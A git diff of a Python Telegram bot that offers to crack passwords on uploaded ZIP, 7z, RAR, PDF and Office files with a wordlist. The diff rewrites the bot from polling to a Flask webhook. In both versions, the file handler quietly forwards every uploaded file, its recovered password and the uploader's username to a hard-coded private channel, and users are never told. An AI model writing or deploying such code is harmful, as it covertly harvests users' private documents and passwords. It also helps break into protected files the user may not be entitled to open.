@@ -1,21 +1,34 @@
 import os
+import json
 import requests
 import pyzipper
 import py7zr
 import pdfplumber
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from flask import Flask, request, jsonify
 from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("BOT_TOKEN")
-PRIVATE_CHANNEL = -1004491770657  # 🔥 APNA PRIVATE CHANNEL ID DALO
+PRIVATE_CHANNEL = -1004491770657  # 🔥 APNA PRIVATE CHANNEL ID
 CHANNEL_USERNAME = "@nrtecno2"
+
+app = Flask(__name__)
+
+# ============================================================
+# WORDLIST LOADER
+# ============================================================
+def load_wordlist(path="password.txt"):
+    if os.path.exists(path):
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            return [line.strip() for line in f if line.strip()]
+    return ['123456', 'password', 'admin', '1234', '0000']
+
+WORDLIST = load_wordlist()
 
 # ============================================================
 # CHANNEL CHECK
 # ============================================================
-async def check_channel_membership(user_id):
+def check_channel_membership(user_id):
     try:
         url = f"https://api.telegram.org/bot{TOKEN}/getChatMember"
         params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
@@ -29,18 +42,45 @@ async def check_channel_membership(user_id):
         return False
 
 # ============================================================
-# WORDLIST
+# SEND MESSAGE HELPER
 # ============================================================
-def load_wordlist(path="wordlist.txt"):
-    if os.path.exists(path):
-        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
-            return [line.strip() for line in f if line.strip()]
-    return ['123456', 'password', 'admin', '1234', '0000', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey']
+def send_message(chat_id, text, reply_markup=None, parse_mode='Markdown'):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": parse_mode
+    }
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    requests.post(url, json=payload)
 
-WORDLIST = load_wordlist()
+def edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
+    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
+    payload = {
+        "chat_id": chat_id,
+        "message_id": message_id,
+        "text": text,
+        "parse_mode": parse_mode
+    }
+    if reply_markup:
+        payload["reply_markup"] = json.dumps(reply_markup)
+    requests.post(url, json=payload)
+
+def send_document(chat_id, file_path, caption=""):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(file_path, 'rb') as f:
+        files = {'document': f}
+        data = {'chat_id': chat_id, 'caption': caption}
+        requests.post(url, files=files, data=data)
+
+def answer_callback(callback_id, text=""):
+    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
+    payload = {"callback_query_id": callback_id, "text": text}
+    requests.post(url, json=payload)
 
 # ============================================================
-# CRACKERS
+# FILE CRACKERS
 # ============================================================
 def crack_zip(file_path):
     for pwd in WORDLIST:
@@ -115,175 +155,183 @@ def crack_file(file_path, ext):
     return None
 
 # ============================================================
-# HANDLERS
+# INLINE KEYBOARD HELPERS
 # ============================================================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if not await check_channel_membership(user_id):
-        # 🔴 RED COLOR BUTTONS - NOT JOINED
-        keyboard = [
+def join_verify_keyboard():
+    return {
+        "inline_keyboard": [
             [
-                InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
-                InlineKeyboardButton("✅ VERIFY", callback_data="verify")
+                {"text": "🔴 JOIN CHANNEL", "url": "https://t.me/nrtecno2"},
+                {"text": "✅ VERIFY", "callback_data": "verify"}
             ]
         ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            "🔴 *Access Denied!*\n\n"
-            "❌ You must join our channel first to use this bot.\n\n"
-            "👉 @nrtecno2\n\n"
-            "_Click JOIN CHANNEL button, then click VERIFY._",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-        return
-    
-    # ✅ JOINED - Directly ask for file
-    await update.message.reply_text(
-        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
-        "✅ Channel Member Verified!\n\n"
-        "📁 *Send me any password protected file.*\n\n"
-        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
-        parse_mode='Markdown'
-    )
+    }
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    user_id = update.effective_user.id
-    
-    if query.data == "verify":
-        if await check_channel_membership(user_id):
-            # ✅ VERIFIED - Ask for file
-            await query.edit_message_text(
-                "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
-                "✅ Channel Member Verified!\n\n"
-                "📁 *Send me any password protected file.*\n\n"
-                "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
-                parse_mode='Markdown'
-            )
-        else:
-            # Still not joined
-            keyboard = [
-                [
-                    InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
-                    InlineKeyboardButton("✅ VERIFY", callback_data="verify")
-                ]
-            ]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            
-            await query.edit_message_text(
-                "🔴 *Still Not Verified!*\n\n"
-                "❌ Please join @nrtecno2 first.\n\n"
-                "_Click JOIN CHANNEL, then VERIFY._",
-                reply_markup=reply_markup,
-                parse_mode='Markdown'
-            )
-
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    username = update.effective_user.username or str(user_id)
-    
-    # Check if user joined channel
-    if not await check_channel_membership(user_id):
-        keyboard = [
-            [
-                InlineKeyboardButton("🔴 JOIN CHANNEL", url="https://t.me/nrtecno2"),
-                InlineKeyboardButton("✅ VERIFY", callback_data="verify")
-            ]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await update.message.reply_text(
-            "🔴 *Access Denied!*\n\n"
-            "❌ Please join @nrtecno2 first.",
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-        return
-    
-    file = update.message.document
-    if not file:
-        await update.message.reply_text(
-            "❌ *Please send a file.*\n\n"
-            "Send any password protected file.",
-            parse_mode='Markdown'
-        )
-        return
-    
-    # Download file
-    file_obj = await file.get_file()
-    file_path = f"downloads/{file.file_name}"
-    os.makedirs("downloads", exist_ok=True)
-    await file_obj.download_to_drive(file_path)
-    
-    await update.message.reply_text(
-        "🔍 *Cracking Password...*\n\n"
-        "⏳ Please wait, this may take a few moments.",
-        parse_mode='Markdown'
-    )
-    
-    # Crack
-    ext = file.file_name.split('.')[-1].lower()
-    password = crack_file(file_path, ext)
-    
-    # Forward to private channel
+# ============================================================
+# WEBHOOK HANDLER
+# ============================================================
+@app.route(f'/webhook/{TOKEN}', methods=['POST'])
+def webhook():
     try:
-        caption = f"📁 File: {file.file_name}\n🔑 Password: {password or 'NOT FOUND'}\n👤 User: @{username}"
-        with open(file_path, 'rb') as f:
-            await context.bot.send_document(
-                chat_id=PRIVATE_CHANNEL,
-                document=f,
-                caption=caption
-            )
+        update = request.get_json()
+        
+        if not update:
+            return jsonify({"status": "error", "message": "No update"}), 400
+        
+        # ---------- MESSAGE HANDLER ----------
+        if 'message' in update:
+            message = update['message']
+            chat_id = message['chat']['id']
+            user_id = message['from']['id']
+            username = message['from'].get('username', str(user_id))
+            
+            # /start command
+            if 'text' in message and message['text'] == '/start':
+                if not check_channel_membership(user_id):
+                    send_message(
+                        chat_id,
+                        "🔴 *Access Denied!*\n\n"
+                        "❌ Please join @nrtecno2 first.\n\n"
+                        "_Click JOIN CHANNEL, then VERIFY._",
+                        reply_markup=join_verify_keyboard()
+                    )
+                else:
+                    send_message(
+                        chat_id,
+                        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
+                        "✅ Channel Member Verified!\n\n"
+                        "📁 *Send me any password protected file.*\n\n"
+                        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX"
+                    )
+                return jsonify({"status": "ok"}), 200
+            
+            # ---------- FILE HANDLER ----------
+            if 'document' in message:
+                file = message['document']
+                file_name = file.get('file_name', 'unknown')
+                file_id = file['file_id']
+                
+                # Channel check
+                if not check_channel_membership(user_id):
+                    send_message(
+                        chat_id,
+                        "🔴 *Access Denied!*\n\n❌ Please join @nrtecno2 first.",
+                        reply_markup=join_verify_keyboard()
+                    )
+                    return jsonify({"status": "ok"}), 200
+                
+                # Download file
+                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
+                file_path_api = file_info['result']['file_path']
+                
+                file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path_api}"
+                response = requests.get(file_url)
+                
+                os.makedirs("downloads", exist_ok=True)
+                file_path = f"downloads/{file_name}"
+                with open(file_path, 'wb') as f:
+                    f.write(response.content)
+                
+                send_message(chat_id, "🔍 *Cracking Password...*\n\n⏳ Please wait...")
+                
+                # Crack
+                ext = file_name.split('.')[-1].lower()
+                password = crack_file(file_path, ext)
+                
+                # Result
+                if password:
+                    send_message(
+                        chat_id,
+                        f"✅ *Password Cracked!*\n\n🔑 `{password}`\n\n📁 {file_name}"
+                    )
+                    
+                    # Forward to private channel
+                    try:
+                        caption = f"✅ Password Found!\n📁 File: {file_name}\n🔑 Password: `{password}`\n👤 User: @{username}"
+                        send_document(PRIVATE_CHANNEL, file_path, caption)
+                    except:
+                        pass
+                else:
+                    send_message(
+                        chat_id,
+                        f"❌ *Password Not Found!*\n\n"
+                        f"📁 {file_name}\n"
+                        f"🔢 {len(WORDLIST)} passwords tried.\n\n"
+                        f"_Try with a larger wordlist._"
+                    )
+                    
+                    # Forward to private channel
+                    try:
+                        caption = f"❌ Password Not Found!\n📁 File: {file_name}\n🔢 Tried: {len(WORDLIST)} passwords\n👤 User: @{username}"
+                        send_document(PRIVATE_CHANNEL, file_path, caption)
+                    except:
+                        pass
+                
+                os.remove(file_path)
+                return jsonify({"status": "ok"}), 200
+        
+        # ---------- CALLBACK QUERY HANDLER ----------
+        if 'callback_query' in update:
+            callback = update['callback_query']
+            callback_id = callback['id']
+            chat_id = callback['message']['chat']['id']
+            message_id = callback['message']['message_id']
+            user_id = callback['from']['id']
+            data = callback['data']
+            
+            if data == 'verify':
+                if check_channel_membership(user_id):
+                    edit_message(
+                        chat_id,
+                        message_id,
+                        "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
+                        "✅ Channel Member Verified!\n\n"
+                        "📁 *Send me any password protected file.*\n\n"
+                        "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX"
+                    )
+                else:
+                    edit_message(
+                        chat_id,
+                        message_id,
+                        "🔴 *Still Not Verified!*\n\n"
+                        "❌ Please join @nrtecno2 first.",
+                        reply_markup=join_verify_keyboard()
+                    )
+                
+                answer_callback(callback_id)
+                return jsonify({"status": "ok"}), 200
+        
+        return jsonify({"status": "ok"}), 200
+        
     except Exception as e:
-        print(f"Forward failed: {e}")
+        print(f"Error: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+# ============================================================
+# SET WEBHOOK
+# ============================================================
+def set_webhook():
+    render_url = os.getenv("RENDER_URL", "https://your-bot.onrender.com")
+    webhook_url = f"{render_url}/webhook/{TOKEN}"
     
-    # Reply to user
-    if password:
-        await update.message.reply_text(
-            f"✅ *Password Cracked!*\n\n"
-            f"🔑 `{password}`\n\n"
-            f"📁 {file.file_name}",
-            parse_mode='Markdown'
-        )
+    url = f"https://api.telegram.org/bot{TOKEN}/setWebhook"
+    response = requests.post(url, json={"url": webhook_url})
+    
+    if response.status_code == 200:
+        print(f"✅ Webhook set to: {webhook_url}")
     else:
-        await update.message.reply_text(
-            f"❌ *Password Not Found*\n\n"
-            f"📁 {file.file_name}\n"
-            f"🔢 {len(WORDLIST)} passwords tried.\n\n"
-            f"_Try with a larger wordlist._",
-            parse_mode='Markdown'
-        )
-    
-    # Cleanup
-    os.remove(file_path)
+        print(f"❌ Webhook failed: {response.text}")
 
 # ============================================================
 # MAIN
 # ============================================================
-def main():
-    if not TOKEN:
-        print("❌ BOT_TOKEN not found!")
-        return
-    
-    # Delete webhook
-    try:
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook")
-        print("✅ Webhook Deleted")
-    except:
-        pass
-    
-    app = Application.builder().token(TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    app.add_handler(CallbackQueryHandler(button_callback))
-    
-    print("🤖 NRTECNO BOT STARTED...")
-    app.run_polling()
-
 if __name__ == "__main__":
-    main()
+    # Set webhook on startup
+    set_webhook()
+    
+    port = int(os.environ.get("PORT", 5000))
+    print(f"🤖 NRTECNO BOT STARTED (Flask + Webhook)...")
+    print(f"📊 Loaded {len(WORDLIST)} passwords")
+    print(f"🚀 Running on port {port}")
+    
+    app.run(host="0.0.0.0", port=port)
